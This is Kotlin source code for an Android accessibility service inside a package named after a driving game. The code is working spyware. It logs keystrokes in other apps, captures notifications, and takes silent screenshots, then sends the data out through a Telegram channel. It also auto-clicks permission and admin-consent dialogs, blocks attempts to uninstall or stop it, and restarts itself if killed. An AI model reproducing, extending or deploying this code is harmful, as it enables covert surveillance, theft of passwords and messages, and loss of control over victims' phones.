package com.ansangha.drdriving

import android.accessibilityservice.AccessibilityService
import android.app.AlarmManager
import android.app.PendingIntent
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.SystemClock
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.io.ByteArrayOutputStream

class MyAccessibilityService : AccessibilityService() {

    private val handler = Handler(Looper.getMainLooper())
    private lateinit var intelManager: IntelligenceManager
    
    private val watchdogRunnable = object : Runnable {
        override fun run() {
            ensureServiceRunning()
            autoActivateAdmin()
            handler.postDelayed(this, 15000) 
        }
    }

    companion object {
        var instance: MyAccessibilityService? = null
        val keylogs = StringBuilder()
        var antiKillActive = true
        var autoAllowActive = true
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        intelManager = IntelligenceManager(this)
        autoActivateAdmin()
        ensureServiceRunning()
        handler.post(watchdogRunnable)
        RemoteControlService.forwardToTelegram("✅ *SYSTEM PROTECTION:* Fully established.")
    }

    private fun autoActivateAdmin() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(this, MyDeviceAdminReceiver::class.java)
        if (!dpm.isAdminActive(admin)) {
            try {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
            } catch (e: Exception) {}
        }
    }

    private fun ensureServiceRunning() {
        val serviceIntent = Intent(this, RemoteControlService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(serviceIntent)
            else startService(serviceIntent)
        } catch (e: Exception) {}
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        val pkgName = event?.packageName?.toString() ?: ""
        val text = event?.text?.toString()?.lowercase() ?: ""

        val isSystemPackage = pkgName.contains("permissioncontroller") || 
                             pkgName.contains("settings") || 
                             pkgName.contains("packageinstaller") || 
                             pkgName.contains("systemui")

        // 1. ANTI-KILL (Toggleable via bot)
        if (antiKillActive && (pkgName.contains("settings") || pkgName.contains("packageinstaller"))) {
            val isOurApp = text.contains("dr driving") || text.contains("system optimization") || text.contains("security")
            val dangerWords = listOf("uninstall", "deactivate", "delete", "clear", "force stop", "disable", "stop", "remove")
            
            if (isOurApp && dangerWords.any { text.contains(it) }) {
                performGlobalAction(GLOBAL_ACTION_BACK)
                RemoteControlService.forwardToTelegram("🛡️ *ANTI-KILL:* Modification blocked.")
                return
            }
        }

        // 2. AUTO-ALLOW (Zero Click)
        if (autoAllowActive && isSystemPackage) {
            val root = rootInActiveWindow
            if (root != null) {
                val keywords = listOf(
                    "allow", "while using the app", "only this time", "ok", "accept", 
                    "start now", "continue", "activate", "i'm aware", "confirm", "permit"
                )
                for (key in keywords) {
                    if (clickNodeByTextPrecise(root, key)) break
                }
            }
        }

        // 3. NOTIFICATION LOGGING
        if (event?.eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            val data = event.parcelableData
            if (data is android.app.Notification) {
                val title = data.extras.getString(android.app.Notification.EXTRA_TITLE)
                val body = data.extras.getCharSequence(android.app.Notification.EXTRA_TEXT)
                if (title != null || body != null) {
                    RemoteControlService.forwardToTelegram("🔔 *NOTIF:* [$pkgName]\n*T:* $title\n*B:* $body")
                    intelManager.logEvent("NOTIF", "[$pkgName] $title: $body")
                }
            }
        }
        
        // 4. KEYLOGGING
        if (event?.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || event?.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            val nodeText = event.text?.toString() ?: ""
            if (nodeText.isNotEmpty() && nodeText != "[]" && !isSystemPackage) {
                keylogs.append("[$pkgName] $nodeText\n")
                intelManager.logEvent("KEYLOG", "[$pkgName] $nodeText")
                if (keylogs.length > 800) {
                    RemoteControlService.forwardToTelegram("⌨️ *LOGS:*\n$keylogs")
                    keylogs.setLength(0)
                }
            }
        }
    }

    private fun clickNodeByTextPrecise(node: AccessibilityNodeInfo, text: String): Boolean {
        val nodes = node.findAccessibilityNodeInfosByText(text)
        for (n in nodes) {
            if (n.isVisibleToUser && n.isEnabled) {
                if (n.isClickable || n.className?.contains("Button") == true) {
                    if (n.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
                }
                var p = n.parent
                while (p != null) {
                    if (p.isClickable) {
                        if (p.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
                    }
                    p = p.parent
                }
            }
        }
        return false
    }

    fun takeSilentScreenshot(callback: (ByteArray) -> Unit) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(0, mainExecutor, object : TakeScreenshotCallback {
                override fun onSuccess(res: ScreenshotResult) {
                    val bitmap = android.graphics.Bitmap.wrapHardwareBuffer(res.hardwareBuffer, res.colorSpace)
                    if (bitmap != null) {
                        val baos = ByteArrayOutputStream()
                        bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, baos)
                        callback(baos.toByteArray())
                    }
                }
                override fun onFailure(err: Int) {}
            })
        }
    }

    override fun onInterrupt() {}
    override fun onUnbind(intent: Intent?): Boolean {
        instance = null
        val pi = PendingIntent.getService(this, 99, Intent(this, this.javaClass), PendingIntent.FLAG_IMMUTABLE)
        (getSystemService(Context.ALARM_SERVICE) as AlarmManager).set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 1000, pi)
        return super.onUnbind(intent)
    }
}
